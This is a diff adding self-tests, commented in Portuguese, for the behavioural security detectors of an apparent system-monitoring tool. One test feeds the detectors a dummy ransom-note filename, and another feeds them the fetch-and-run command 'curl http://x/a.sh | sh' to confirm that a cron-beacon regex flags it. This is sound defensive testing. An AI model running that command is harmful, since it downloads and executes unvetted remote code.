@@ -134,6 +134,28 @@ def _run_all(tmp, failures):
     sys_results = monitor.system_checks(cfg)
     _check(failures, any(r.check.startswith("disk:") for r in sys_results),
            "checagem de disco roda")
+    # segurança comportamental (JADEPUFFER): roda, é observe-only e não grita à toa
+    sec = [r for r in sys_results if r.check.startswith("security:")]
+    _check(failures, bool(sec), "detectores de segurança comportamental rodam")
+    _check(failures, all(not r.fixable for r in sec),
+           "achados de segurança são observe-only (fixable=False)")
+    _check(failures, all(r.ok for r in sec),
+           "sem falso-positivo de segurança no ambiente limpo do selftest")
+    from . import security
+    # detector de nota de resgate: pega o padrão inequívoco, ignora arquivo normal
+    ransom_dir = os.path.join(tmp, "ransomtest")
+    os.makedirs(ransom_dir)
+    open(os.path.join(ransom_dir, "HOW_TO_DECRYPT_FILES.txt"), "w").close()
+    open(os.path.join(ransom_dir, "relatorio.pdf"), "w").close()
+    hits = [n for n in os.listdir(ransom_dir) if security._RANSOM_RE.search(n)]
+    _check(failures, hits == ["HOW_TO_DECRYPT_FILES.txt"],
+           "detector de ransom pega nota de resgate e ignora arquivo normal")
+    # detector de cron-beacon: pega curl|sh, ignora curl normal (ex.: pro Telegram)
+    _check(failures,
+           bool(security._CRON_BEACON_RE.search("curl http://x/a.sh | sh"))
+           and not security._CRON_BEACON_RE.search(
+               "curl -s -F chat_id=1 https://api.telegram.org/botX/sendMessage"),
+           "detector de cron-beacon pega curl|sh e ignora curl legítimo")
     state = {}
     confirmed["ports"] = [1]  # porta certamente fechada
     results = monitor.project_checks(cfg, confirmed, state)
